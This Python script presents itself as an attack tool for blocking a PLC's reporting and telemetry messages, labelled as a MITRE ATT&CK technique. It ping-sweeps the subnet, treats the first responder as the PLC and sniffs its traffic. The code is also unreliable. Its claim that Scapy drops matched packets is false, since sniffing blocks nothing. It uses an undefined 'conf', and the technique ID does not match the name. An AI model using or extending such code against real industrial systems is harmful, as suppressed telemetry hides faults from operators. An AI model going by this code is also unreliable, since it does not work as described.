import scapy.all as scapy
import socket
import struct
import time
import threading

# MITRE ATT&CK T1034: Inhibit Response Function - Block Reporting Message

# Configuration -  Adjust these based on your specific network and PLC
TARGET_PLC_IP = None  # Will be discovered if None
REPORTING_MESSAGE_SIGNATURE = b"TelemetryData" # Example - Customize based on message content
NETWORK_INTERFACE = "Ethernet"  # Replace with your network interface name (e.g., "Wi-Fi", "ens33")
BLOCK_DURATION = 30 #seconds -  Time to block the reporting messages

# Global flag to control packet blocking
BLOCK_REPORTING = False

def find_plc_ip():
    """
    Discover the PLC's IP address on the network.
    Assumes PLC responds to a common protocol (e.g., ping, Modbus).
    This is a basic example using ping.  More robust methods might be needed
    depending on the PLC configuration.
    """
    global TARGET_PLC_IP
    if TARGET_PLC_IP:
        return #Already discovered or configured.

    print("Attempting to discover PLC IP address...")

    # 1. Get local network information
    try:
        # Get the network interface's information using scapy
        conf.verb = 0  # Suppress verbose output from scapy
        local_ip = scapy.get_if_addr(NETWORK_INTERFACE)
        netmask = scapy.get_if_netmask(NETWORK_INTERFACE)

        if not local_ip or not netmask:
            print(f"Error: Could not determine local IP or netmask for interface {NETWORK_INTERFACE}.  Check interface name.")
            return None

        # Calculate network address and broadcast address
        ip_int = struct.unpack("!I", socket.inet_aton(local_ip))[0]
        netmask_int = struct.unpack("!I", socket.inet_aton(netmask))[0]
        network_addr_int = ip_int & netmask_int
        broadcast_addr_int = network_addr_int | (~netmask_int & 0xFFFFFFFF)
        network_addr = socket.inet_ntoa(struct.pack("!I", network_addr_int))
        broadcast_addr = socket.inet_ntoa(struct.pack("!I", broadcast_addr_int))

        print(f"Local Network: {network_addr}/{netmask}")
        print(f"Broadcast Address: {broadcast_addr}")

    except OSError as e:
        print(f"Error getting network info: {e}")
        print(f"Ensure the interface name '{NETWORK_INTERFACE}' is correct and active.")
        return None


    # 2. Ping sweep the network (very basic)
    for i in range(1, 255): # Assuming a /24 network
        target_ip = network_addr.split('.')[0] + '.' + network_addr.split('.')[1] + '.' + network_addr.split('.')[2] + '.' + str(i)
        if target_ip == local_ip:  # Don't ping ourselves
            continue

        ping_reply = scapy.IP(dst=target_ip, ttl=2)/scapy.ICMP()
        try:
            reply = scapy.sr1(ping_reply, timeout=0.5, verbose=False)  # Adjust timeout as needed

            if reply and reply.haslayer(scapy.ICMP) and reply.getlayer(scapy.ICMP).type == 0:  # Type 0 is Echo Reply
                #This is a VERY naive approach. You should implement better detection mechanisms, such as Nmap version detection
                #or sniffing PLC specific protocols
                print(f"Possible PLC found at: {target_ip}")
                TARGET_PLC_IP = target_ip  # Assign the first responsive IP as the PLC IP
                print(f"PLC IP address found: {TARGET_PLC_IP}")
                return #Stop after finding the first possible PLC IP.
        except Exception as e:
            print(f"Error during ping sweep: {e}")
            return None


    print("PLC IP address not found.  Please configure TARGET_PLC_IP manually.")
    return None


def packet_callback(packet):
    """
    Callback function for Scapy to process each captured packet.
    """
    global BLOCK_REPORTING
    if BLOCK_REPORTING and packet.haslayer(scapy.Raw):
        raw_data = packet[scapy.Raw].load
        if REPORTING_MESSAGE_SIGNATURE in raw_data:
            # Block the packet by dropping it.  Scapy does this implicitly.
            print(f"Blocking reporting message from {packet[scapy.IP].src} to {packet[scapy.IP].dst}")
            return  # Suppress transmission of the packet


def block_reporting_messages(duration):
  """
  Blocks reporting messages for a specified duration.
  """
  global BLOCK_REPORTING

  BLOCK_REPORTING = True
  print(f"Blocking reporting messages for {duration} seconds...")
  time.sleep(duration)
  BLOCK_REPORTING = False
  print("Reporting message blocking stopped.")


def start_packet_capture():
    """
    Starts capturing network packets using Scapy.
    """
    if not TARGET_PLC_IP:
        print("Error: PLC IP address is not defined.  Exiting.")
        return

    print(f"Starting packet capture on interface {NETWORK_INTERFACE}...")
    print(f"Filtering traffic to and from PLC IP: {TARGET_PLC_IP}")

    # Define the filter to capture only traffic to/from the PLC.  Crucial to reduce overhead
    packet_filter = f"host {TARGET_PLC_IP}"

    try:
        scapy.sniff(iface=NETWORK_INTERFACE, filter=packet_filter, prn=packet_callback, store=0)  # store=0 disables storing packets in memory.
    except Exception as e:
        print(f"Error during packet capture: {e}")
        print("Check network interface name and permissions (root/sudo required).")



if __name__ == "__main__":

    if not TARGET_PLC_IP:
        find_plc_ip()
        if not TARGET_PLC_IP:
            print("PLC IP discovery failed.  Please manually set TARGET_PLC_IP and try again.")
            exit()

    # Start packet capture in a separate thread to avoid blocking the main thread
    capture_thread = threading.Thread(target=start_packet_capture, daemon=True) #daemon=True means the thread will exit when the main program exits
    capture_thread.start()

    # Allow time for the capture thread to start
    time.sleep(2)  # Adjust as needed

    # Trigger the blocking action for a specified duration
    block_reporting_messages(BLOCK_DURATION)

    # Optionally, wait for the capture thread to complete (though it's a daemon thread)
    print("Waiting for capture thread to finish (or it will terminate on program exit)...")
    time.sleep(5) # Allow the capture thread a little time to potentially process any lingering packets before exiting.  Increase if necessary.
    print("Done.")